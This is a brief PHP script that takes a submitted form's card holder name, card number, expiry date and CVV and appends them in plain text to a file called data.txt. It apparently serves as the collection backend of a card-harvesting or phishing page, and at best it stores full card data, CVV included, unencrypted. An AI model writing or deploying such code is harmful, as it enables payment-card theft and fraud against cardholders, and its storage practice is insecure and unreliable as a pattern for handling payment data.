<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the credit card information from the POST request
    $cardName = htmlspecialchars($_POST['cardName']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $expDate = htmlspecialchars($_POST['expDate']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Format the data in a cool way
    $formattedData = "Card Holder: $cardName\n";
    $formattedData .= "Card Number: $cardNumber\n";
    $formattedData .= "Expiry Date: $expDate\n";
    $formattedData .= "CVV: $cvv\n";
    $formattedData .= "----------------------\n";

    // Append the formatted data to data.txt
    file_put_contents("data.txt", $formattedData, FILE_APPEND);

    echo "Data saved successfully!";
} else {
    echo "No data received.";
}
?>
